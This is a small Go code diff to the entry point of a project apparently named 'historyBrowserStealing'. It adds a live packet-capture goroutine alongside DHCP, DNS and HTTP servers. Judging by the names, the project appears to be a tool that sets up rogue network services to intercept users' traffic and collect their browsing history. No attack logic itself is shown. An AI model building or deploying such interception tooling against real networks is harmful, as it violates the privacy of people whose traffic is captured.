@@ -6,12 +6,13 @@ import (
 	"historyBrowserStealing/dhcp"
 	"historyBrowserStealing/dns"
 	"historyBrowserStealing/http"
+	"historyBrowserStealing/liveCapture"
 	"os"
 )
 
 func main() {
 	channel := make(chan string)
-
+	go liveCapture.StartLiveCapturing()
 	go dhcp.StartDHCPServer()
 	go dns.StartDNSServer(channel)
 	go http.StartHTTPServer(channel)
